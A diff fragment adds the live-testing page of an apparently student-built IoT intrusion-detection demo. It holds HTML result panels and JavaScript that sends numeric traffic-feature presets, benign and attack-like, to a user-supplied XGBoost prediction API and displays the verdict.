+        <div id="result-verdict" style="background:var(--card);border:1px solid var(--border);padding:24px;text-align:center;min-height:90px;display:flex;flex-direction:column;justify-content:center;align-items:center">
+          <div style="font-family:'DM Mono',monospace;font-size:10px;color:var(--muted);letter-spacing:2px">AWAITING ANALYSIS</div>
+        </div>
+
+        <div>
+          <div style="font-family:'DM Mono',monospace;font-size:9px;letter-spacing:2px;color:var(--muted);margin-bottom:6px">BINARY CLASSIFIER</div>
+          <div id="result-binary" style="background:var(--card);border:1px solid var(--border);padding:14px;font-family:'DM Mono',monospace;font-size:11px;color:var(--muted)">—</div>
+        </div>
+
+        <div>
+          <div style="font-family:'DM Mono',monospace;font-size:9px;letter-spacing:2px;color:var(--muted);margin-bottom:6px">ATTACK TYPE CLASSIFIER</div>
+          <div id="result-multi" style="background:var(--card);border:1px solid var(--border);padding:14px;font-family:'DM Mono',monospace;font-size:11px;color:var(--muted)">—</div>
+        </div>
+
+        <div>
+          <div style="font-family:'DM Mono',monospace;font-size:9px;letter-spacing:2px;color:var(--muted);margin-bottom:6px">ANOMALY DETECTOR</div>
+          <div id="result-confidence" style="background:var(--card);border:1px solid var(--border);padding:14px;font-family:'DM Mono',monospace;font-size:11px;color:var(--muted)">—</div>
+        </div>
+
+        <div>
+          <div style="font-family:'DM Mono',monospace;font-size:9px;letter-spacing:2px;color:var(--muted);margin-bottom:6px">API RESPONSE LOG</div>
+          <div id="result-raw" style="background:#020408;border:1px solid var(--border);padding:14px;font-family:'DM Mono',monospace;font-size:10px;color:#666;line-height:1.8;min-height:60px;word-break:break-all">—</div>
+        </div>
+      </div>
+    </div>
+
+    <div style="background:var(--card);border:1px solid var(--border);padding:18px 22px">
+      <div style="font-family:'DM Mono',monospace;font-size:9px;letter-spacing:3px;color:var(--muted);margin-bottom:10px">EXPECTED API CONTRACT</div>
+      <div style="font-family:'DM Mono',monospace;font-size:11px;color:#888;line-height:1.9">
+        <span style="color:var(--accent2)">POST</span> /predict &nbsp;·&nbsp; Content-Type: application/json<br>
+        <span style="color:var(--muted)">Body:</span> <span style="color:#f1f5f9">{ protocol, dst_port, bytes_sent, bytes_received, request_rate, payload_size, session_duration, session_diversity }</span><br>
+        <span style="color:var(--muted)">Response:</span> <span style="color:#f1f5f9">{ is_attack: bool, attack_type: string, binary_confidence: float, multi_confidence: float }</span>
+      </div>
+    </div>
+
+  </div>
+  <div class="pf"><div class="pfl">LIVE TESTING // AI-POWERED DETECTION DEMO</div><div class="pfr"><span style="color:var(--red)">XGBoost Binary · XGBoost Multi-Class · Real-time inference</span></div></div>
+</div>
+
+</div><!-- end #main -->
+
+<script>
+const pages=['intro','dev','iot-arch','net-topo','docker','conception','testing','deploy','collect','train','train-ds','train-def','train-off','report','live-test'];
+const allSi=document.querySelectorAll('.si,.ss');
+
+function go(id){
+  pages.forEach(p=>{
+    const el=document.getElementById('pg-'+p);
+    if(el) el.classList.remove('on');
+  });
+  const t=document.getElementById('pg-'+id);
+  if(t){t.classList.add('on');document.getElementById('main').scrollTop=0;}
+  allSi.forEach(el=>el.classList.remove('on'));
+  allSi.forEach(el=>{
+    const oc=el.getAttribute('onclick');
+    if(oc&&oc.includes("'"+id+"'")) el.classList.add('on');
+  });
+}
+
+function setPreset(type){
+  const presets = {
+    // ── BENIGN ──────────────────────────────────────────────────────────────
+    benign_mqtt: { protocol:'MQTT',    port:1883, sent:420,    recv:180,   rate:2,   payload:60,   duration:120, diversity:1 },
+    benign_http: { protocol:'HTTP',    port:80,   sent:800,    recv:4200,  rate:4,   payload:120,  duration:60,  diversity:3 },
+
+    // ── ATTACKS ─────────────────────────────────────────────────────────────
+    // Port scan — many dst ports, high diversity, low payload, fast rate
+    portscan:    { protocol:'Network', port:445,  sent:180,    recv:60,    rate:150, payload:40,   duration:5,   diversity:48 },
+    // SSH brute force — high bytes sent, high rate, same port, low diversity
+    brute:       { protocol:'SSH',     port:22,   sent:12000,  recv:1800,  rate:110, payload:300,  duration:10,  diversity:1  },
+    // MQTT flood — extreme rate + bytes, same port
+    ddos:        { protocol:'MQTT',    port:1883, sent:98000,  recv:400,   rate:850, payload:1200, duration:3,   diversity:2  },
+    // Reconnaissance — moderate rate, many endpoints, low payload
+    recon:       { protocol:'HTTP',    port:80,   sent:3200,   recv:800,   rate:75,  payload:50,   duration:12,  diversity:40 },
+    // HTTP exploit — large payload, medium rate, path traversal pattern
+    http_exploit:{ protocol:'HTTP',    port:8080, sent:45000,  recv:2000,  rate:60,  payload:8000, duration:8,   diversity:12 },
+    // CoAP flood — high rate, CoAP port, large bytes
+    coap_flood:  { protocol:'CoAP',    port:5683, sent:75000,  recv:300,   rate:700, payload:900,  duration:4,   diversity:5  },
+  };
+  const p = presets[type];
+  if(!p) return;
+  document.getElementById('inp-protocol').value  = p.protocol;
+  document.getElementById('inp-port').value       = p.port;
+  document.getElementById('inp-bytes-sent').value = p.sent;
+  document.getElementById('inp-bytes-recv').value = p.recv;
+  document.getElementById('inp-req-rate').value   = p.rate;
+  document.getElementById('inp-payload').value    = p.payload;
+  document.getElementById('inp-duration').value   = p.duration;
+  document.getElementById('inp-diversity').value  = p.diversity;
+}
+
+async function runTest(){
+  const btn = document.getElementById('btn-test');
+  const verdict = document.getElementById('result-verdict');
+  const binary = document.getElementById('result-binary');
+  const multi = document.getElementById('result-multi');
+  const conf = document.getElementById('result-confidence');
+  const raw = document.getElementById('result-raw');
+  const apiUrl = document.getElementById('inp-api-url').value.trim();
+
+  btn.textContent = '⏳ ANALYSING...';
+  btn.style.opacity = '0.6';
+  verdict.innerHTML = '<div style="font-family:\'DM Mono\',monospace;font-size:10px;color:var(--muted);letter-spacing:2px">CONTACTING API...</div>';
+  binary.textContent = '—'; multi.textContent = '—'; conf.textContent = '—'; raw.textContent = '—';
+
+  const payload = {
+    protocol: document.getElementById('inp-protocol').value,
+    dst_port: parseInt(document.getElementById('inp-port').value),
+    bytes_sent: parseInt(document.getElementById('inp-bytes-sent').value),
+    bytes_received: parseInt(document.getElementById('inp-bytes-recv').value),
+    request_rate: parseFloat(document.getElementById('inp-req-rate').value),
+    payload_size: parseInt(document.getElementById('inp-payload').value),
+    session_duration: parseInt(document.getElementById('inp-duration').value),
+    session_diversity: parseInt(document.getElementById('inp-diversity').value)
+  };
+
+  try {
+    const res = await fetch(apiUrl, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(payload)
+    });
+    const data = await res.json();
+    raw.textContent = JSON.stringify(data, null, 2);
+
+    const isAttack  = data.is_attack === true || data.is_attack === 1;
+    // binary is the main source of truth for the verdict
+    const binAttack = data.binary ? (data.binary.is_attack === true || data.binary.is_attack === 1) : isAttack;
+    // attack type — only meaningful when binary says attack
+    const attackType = (data.multi && data.multi.attack_type) ? data.multi.attack_type : (data.attack_type || 'unknown');
+    const displayType = (attackType.toLowerCase() === 'benign') ? 'UNKNOWN' : attackType.toUpperCase();
+
+    // ── Verdict banner — driven by binAttack only ──────────────────────────
+    if(binAttack){
+      verdict.innerHTML = '<div style="font-family:\'Bebas Neue\',sans-serif;font-size:36px;color:var(--red);margin-bottom:6px">⚠ ATTACK DETECTED</div><div style="font-family:\'DM Mono\',monospace;font-size:11px;color:var(--red);letter-spacing:2px">' + displayType + '</div>';
+      verdict.style.borderLeft = '3px solid var(--red)';
+      verdict.style.background = '#140a0a';
+    } else {
+      verdict.innerHTML = '<div style="font-family:\'Bebas Neue\',sans-serif;font-size:36px;color:#4ade80;">✓ BENIGN TRAFFIC</div>';
+      verdict.style.borderLeft = '3px solid #4ade80';
+      verdict.style.background = '#0a140a';
+    }
+
+    // ── Binary classifier — just ATTACK or BENIGN ──────────────────────────
+    const binColor  = binAttack ? 'var(--red)' : '#4ade80';
+    const binLabel  = binAttack ? 'ATTACK' : 'BENIGN';
+    binary.style.borderLeft = '2px solid ' + binColor;
+    binary.style.color = binColor;
+    binary.textContent = binLabel;
+
+    // ── Multi-class ────────────────────────────────────────────────────────
+    // binary=attack + multi=benign → models disagree → UNKNOWN
+    // binary=benign → always BENIGN regardless of what multi says
+    // binary=attack + multi=attack type → show the type
+    if(!binAttack){
+      multi.style.borderLeft = '2px solid #4ade80';
+      multi.style.color = '#4ade80';
+      multi.textContent = 'BENIGN';
+    } else {
+      const displayType = (attackType.toLowerCase() === 'benign') ? 'UNKNOWN' : attackType.toUpperCase();
+      multi.style.borderLeft = '2px solid var(--red)';
+      multi.style.color = 'var(--red)';
+      multi.textContent = displayType;
+    }
+
+    // ── Anomaly detector — score >= 4 = anomaly ────────────────────────────
+    if(data.anomaly){
+      const score    = data.anomaly.anomaly_score !== undefined ? data.anomaly.anomaly_score : 0;
+      const isAnom   = score >= 4;
+      const anomColor = isAnom ? 'var(--orange)' : '#4ade80';
+      conf.style.borderLeft = '2px solid ' + anomColor;
+      conf.style.color = anomColor;
+      conf.textContent = (isAnom ? 'ANOMALY DETECTED' : 'NORMAL') + '  —  score: ' + score.toFixed(2);
+    } else {
+      conf.textContent = '—';
+    }
+
+    raw.style.color = '#4ade80';
+  } catch(e) {
+    verdict.innerHTML = '<div style="font-family:\'DM Mono\',monospace;font-size:10px;color:var(--orange)">API UNREACHABLE</div><div style="font-size:12px;color:var(--muted);margin-top:6px">Check API URL and CORS settings</div>';
+    verdict.style.borderLeft = '3px solid var(--orange)';
+    raw.style.color = 'var(--orange)';
+    raw.textContent = 'Error: ' + e.message + '\n\nMake sure your backend API is running and CORS is enabled.\nExpected endpoint: POST /predict';
+  }
+
+  btn.textContent = '▶ ANALYSE TRAFFIC';
+  btn.style.opacity = '1';
+}
+</script>
+</body>
+</html>
